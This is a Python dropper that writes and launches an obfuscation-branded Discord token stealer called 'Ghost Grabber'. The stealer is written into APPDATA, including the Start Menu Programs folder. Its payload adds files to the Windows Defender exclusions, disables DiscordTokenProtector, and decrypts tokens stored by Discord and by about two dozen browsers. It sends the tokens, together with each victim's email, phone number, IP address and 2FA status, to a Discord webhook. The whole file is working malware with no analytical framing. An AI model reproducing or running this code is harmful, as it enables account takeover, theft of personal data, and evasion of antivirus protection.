import sys
import os

content = """
import subprocess
import sys
subprocess.run(["cmd.exe", "/c", sys.executable, "-m", "pip", "install", "fernet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
from fernet import Fernet

#   Created & Obfuscated By Arora
#
#
#
#      █████████  █████                        █████
#     ███░░░░░███░░███                        ░░███
#    ███     ░░░  ░███████    ██████   █████  ███████
#   ░███          ░███░░███  ███░░███ ███░░  ░░░███░
#   ░███    █████ ░███ ░███ ░███ ░███░░█████   ░███
#   ░░███  ░░███  ░███ ░███ ░███ ░███ ░░░░███  ░███ ███
#    ░░█████████  ████ █████░░██████  ██████   ░░█████
#     ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░░     ░░░░░
#
#      █████████                      █████     █████
#     ███░░░░░███                    ░░███     ░░███
#    ███     ░░░  ████████   ██████   ░███████  ░███████   ██████  ████████
#   ░███         ░░███░░███ ░░░░░███  ░███░░███ ░███░░███ ███░░███░░███░░███
#   ░███    █████ ░███ ░░░   ███████  ░███ ░███ ░███ ░███░███████  ░███ ░░░
#   ░░███  ░░███  ░███      ███░░███  ░███ ░███ ░███ ░███░███░░░   ░███
#    ░░█████████  █████    ░░████████ ████████  ████████ ░░██████  █████
#     ░░░░░░░░░  ░░░░░      ░░░░░░░░ ░░░░░░░░  ░░░░░░░░   ░░░░░░  ░░░░░


WEBHOOK = ''
CONFIG = {'discord': True}

import subprocess
subprocess.run(['pip','install','pywin32'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
subprocess.run(['pip','install','pycryptodome'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
subprocess.run(['pip','install','zlib'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
subprocess.run(['pip','install','requests'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

import os
import concurrent.futures
import json
import random
import requests
import sys
import zlib
import base64
import re
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
localappdata = os.getenv("localappdata")
if not hasattr(sys, "_MEIPASS"):
	sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))


def main():
    threads = []

    threads.append(Discord)

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(lambda func: func(), threads)

def Arora():
	def GetSelf() -> tuple[str, bool]:
		if hasattr(sys, "frozen"):
			return (sys.argv[0], True)
		else:
			return (__file__, False)    

	def ExcludeFromDefender(path) -> None:
		subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
		
	def IsConnectedToInternet() -> bool:
		try:
			return requests.get("https://gstatic.com/generate_204").status_code == 204
		except Exception:
			return False
		
	if not IsConnectedToInternet():
		os._exit(0)

	path, isExecutable = GetSelf()
	inStartup = os.path.basename(os.path.dirname(path)).lower() == "startup"
	if isExecutable and (CONFIG["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.Arora")):
		if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")):
			os.remove(boundFileDst)
		with open(boundFileSrc, "rb") as f:
			content = f.read()
		decrypted = zlib.decompress(content[::-1])
		with open(boundFileDst, "wb") as f:
			f.write(decrypted)
		del content, decrypted
				  
		ExcludeFromDefender(boundFileDst)
		subprocess.Popen("start bound.exe", shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

	with concurrent.futures.ThreadPoolExecutor() as executor:
		executor.submit(main)


class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.killprotector()
        self.getTokens()
        self.upload(WEBHOOK)

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "비밀번호 해독 실패"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def getTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, WEBHOOK):  
        for token in self.tokens:
            def ip():
                try:
                    res = requests.get('https://checkip.amazonaws.com?format=json')
                    return res.text.strip()
                except requests.RequestException:
                    return
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            discord_id = user['id']
            username = user['username']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            email = user.get('email', 'N/A')
            phone = user.get('phone', 'N/A')
            mfa_enabled = user.get('mfa_enabled', False)
            
            data = {
                "content": '||@everyone|| ',
                "embeds": [
                    {
                        "title": f"{username}",
                        "thumbnail": { "url": avatar_url },
                        "description": f"👤 **UID :** __`{discord_id}`__\n" +
                            f"📧 **Email :** __`{email}`__\n" +
                            f"📱 **Phone :** __||`{phone}`||__\n" +
                            f"🔐 **2FA :** __`{'활성화' if mfa_enabled else '비활성화'}`__\n\n" +
                            f"🌐**IP Address :** __||`{ip()}`||__\n" +
                            f"👑**Token :** __||`{token}`||__",
                        "footer": { "text": "Ghost Grabber | Created By Arora" },
                        "color": 0x8cd2ff,
                    }
                ],
                "username": "Ghost",
                "avatar_url": "https://cdn.discordapp.com/app-assets/1312040777475686510/1375418897024684073.png",
            }

            requests.post(WEBHOOK, json=data)
            self.tokens_sent.append(token)

Arora()
"""

p = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'python_setup.py')
pp = os.path.join(os.getenv('APPDATA'), 'python_setup.py')

with open(p, 'w', encoding='utf-8') as file:
    file.write(content)
with open(pp, 'w', encoding='utf-8') as file:
    file.write(content)

os.system(sys.executable + " " + p)
os.system(sys.executable + " " + pp)
